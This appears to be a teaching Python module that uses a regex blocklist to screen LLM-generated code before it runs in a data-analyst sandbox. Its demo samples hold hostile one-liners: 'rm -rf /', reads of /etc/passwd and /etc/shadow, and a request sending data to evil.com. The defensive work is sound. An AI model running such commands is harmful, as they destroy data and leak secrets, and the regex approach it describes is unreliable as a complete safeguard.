"""
service/security.py — Code blocklist for the AI Data Analyst sandbox.

What this file does
-------------------
The data analyst's `/analyst` endpoint takes a user's natural-language
question, asks the LLM to write Python code that answers the question,
and runs that code in a subprocess. The LLM is allowed to read CSVs,
filter, group, plot — but NOT to:
  - shell out (`os.system`, `subprocess`)
  - dynamic-import (`__import__`, `eval`, `exec`)
  - read or write files outside the data dir (`open(...)`, `os.remove`)
  - make network requests (`requests`, `httpx`, `urllib`)
  - destroy data (`shutil.rmtree`, `os.unlink`)

This file implements a **hard blocklist** — a regex-pass over the
generated code that REJECTS the call if any blocked pattern is found.
Hard blocklist, not soft warning. The threat model is "an LLM emitting
code that the customer doesn't realize is dangerous." A 95% blocklist
is unacceptable; we need 100%. (A real deployment with untrusted users
would use gVisor or Firecracker; the lesson notes this.)

Why a separate file
-------------------
Security policy is the contract. If a new dangerous pattern emerges
(e.g., a new way to call `eval`), the change goes in THIS file —
not in the sandbox, not in the prompt. One file = one contract.

How to run / import
-------------------
    from security import is_safe, scan_violations
    is_safe("print('hello')")                          # True
    is_safe("os.system('rm -rf /')")                   # False
    scan_violations("os.system('x')")                  # ["os.system"]
"""
from __future__ import annotations

import re
from typing import Iterable


# ---------------------------------------------------------------------------
# The blocklist — one regex per dangerous pattern
# ---------------------------------------------------------------------------
# Each pattern is a regex matched against the generated code. If ANY
# pattern matches, the call is rejected. Patterns are intentionally
# conservative: false positives (rejecting safe code) are OK; false
# negatives (allowing unsafe code) are not.
BLOCKED_PATTERNS: list[tuple[str, str]] = [
    # Pattern name            Regex
    ("os.system",             r"\bos\.system\s*\("),
    ("subprocess",            r"\bsubprocess\s*\."),
    ("__import__",            r"\b__import__\s*\("),
    ("eval",                  r"(?<!\w)eval\s*\("),
    ("exec",                  r"(?<!\w)exec\s*\("),
    ("compile",               r"(?<!\w)compile\s*\("),
    ("open(",                 r"(?<!\w)open\s*\("),
    ("os.remove",             r"\bos\.(remove|unlink|rmdir)\s*\("),
    ("os.walk",               r"\bos\.walk\s*\("),
    ("shutil.rmtree",         r"\bshutil\.rmtree\s*\("),
    ("shutil.move",           r"\bshutil\.move\s*\("),
    ("shutil.copy",           r"\bshutil\.(copy|copyfile)\s*\("),
    ("requests.",             r"\brequests\s*\."),
    ("httpx.",                r"\bhttpx\s*\."),
    ("urllib.",               r"\burllib\s*\."),
    ("socket.",               r"\bsocket\s*\."),
    ("http.client",           r"\bhttp\.client\s*\."),
    ("ctypes.",               r"\bctypes\s*\."),
    ("pickle.loads",          r"\bpickle\.loads\s*\("),
    ("marshal.loads",         r"\bmarshal\.loads\s*\("),
    ("__builtins__",          r"\b__builtins__\b"),
    ("getattr/setattr/delattr", r"\b(getattr|setattr|delattr)\s*\("),
    ("globals()",             r"\bglobals\s*\("),
    ("locals()",              r"\blocals\s*\("),
    ("__dict__",              r"\b__dict__\b"),
    ("pathlib.Path.write",    r"\bpathlib\.Path\s*\([^)]*\)\.write"),
    ("pandas.to_pickle",      r"\.to_pickle\s*\("),
    ("pandas.read_pickle",    r"\.read_pickle\s*\("),
]

# Pre-compile for speed (the analyst might call /analyst 100×/min).
_COMPILED: list[tuple[str, re.Pattern[str]]] = [
    (name, re.compile(pat, re.MULTILINE)) for name, pat in BLOCKED_PATTERNS
]


# ---------------------------------------------------------------------------
# The scanner
# ---------------------------------------------------------------------------
def scan_violations(code: str) -> list[str]:
    """Return a list of pattern names that match `code`.

    Empty list means the code is safe (as far as this blocklist can tell).
    """
    violations: list[str] = []
    for name, pat in _COMPILED:
        if pat.search(code):
            violations.append(name)
    return violations


def is_safe(code: str) -> bool:
    """Return True iff `code` passes the blocklist (no violations)."""
    return len(scan_violations(code)) == 0


# ---------------------------------------------------------------------------
# Whitelisted modules the analyst IS allowed to use
# ---------------------------------------------------------------------------
# The LLM prompt tells the analyst: "you can import from this list."
ALLOWED_IMPORTS: set[str] = {
    # Stdlib (read-only, in-process)
    "math", "statistics", "collections", "itertools", "functools",
    "datetime", "calendar", "re", "json", "csv",
    # Data
    "pandas", "numpy",
    # Plotting (writes to a sandboxed /tmp dir)
    "matplotlib", "matplotlib.pyplot",
}


def is_import_allowed(module: str) -> bool:
    """Check if a module import is allowed (for prompt-enforcement)."""
    return module in ALLOWED_IMPORTS


# ---------------------------------------------------------------------------
# The security contract (the function the LLM-as-judge calls)
# ---------------------------------------------------------------------------
def check(code: str) -> dict:
    """Run the security check on `code`. Return a dict the endpoint
    can serialize and log.

    Example return values:
      {"ok": True,  "violations": [], "code_lines": 12}
      {"ok": False, "violations": ["os.system", "open("], "code_lines": 8}
    """
    violations = scan_violations(code)
    return {
        "ok": len(violations) == 0,
        "violations": violations,
        "code_lines": len(code.splitlines()),
        "code_chars": len(code),
    }


# ---------------------------------------------------------------------------
# CLI demo
# ---------------------------------------------------------------------------
def main() -> int:
    samples = [
        ("safe: groupby",        "import pandas as pd\ndf = pd.read_csv('data.csv')\nprint(df.groupby('region').sum())"),
        ("safe: filter",         "df[df['price'] > 100]['id'].tolist()"),
        ("unsafe: os.system",    "import os; os.system('rm -rf /')"),
        ("unsafe: open write",   "open('/etc/passwd', 'w').write('hax')"),
        ("unsafe: subprocess",   "import subprocess; subprocess.run(['cat', '/etc/shadow'])"),
        ("unsafe: __import__",   "__import__('os').system('whoami')"),
        ("unsafe: requests",     "import requests; requests.get('http://evil.com/exfil?d=' + str(df))"),
        ("unsafe: pickle",       "import pickle; pickle.loads(open('data.pkl', 'rb').read())"),
    ]
    for label, code in samples:
        r = check(code)
        verdict = "✓" if r["ok"] else f"✗ blocked ({', '.join(r['violations'])})"
        print(f"  {label:30s}  {verdict}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())